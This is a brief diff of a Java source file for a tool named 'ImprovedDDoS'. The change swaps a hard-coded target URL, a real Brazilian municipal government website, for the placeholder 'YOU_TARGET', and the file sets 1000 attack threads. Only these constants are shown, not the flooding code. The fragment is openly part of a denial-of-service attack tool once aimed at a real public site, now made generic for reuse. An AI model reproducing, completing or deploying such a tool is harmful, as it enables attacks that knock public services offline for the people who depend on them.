@@ -4,7 +4,7 @@ import java.util.concurrent.*;
 
 public class ImprovedDDoS {
 
-    private static final String TARGET_URL = "https://capimgrosso.ba.gov.br/";
+    private static final String TARGET_URL = "YOU_TARGET";
 
     private static final int NUM_THREADS = 1000;
 
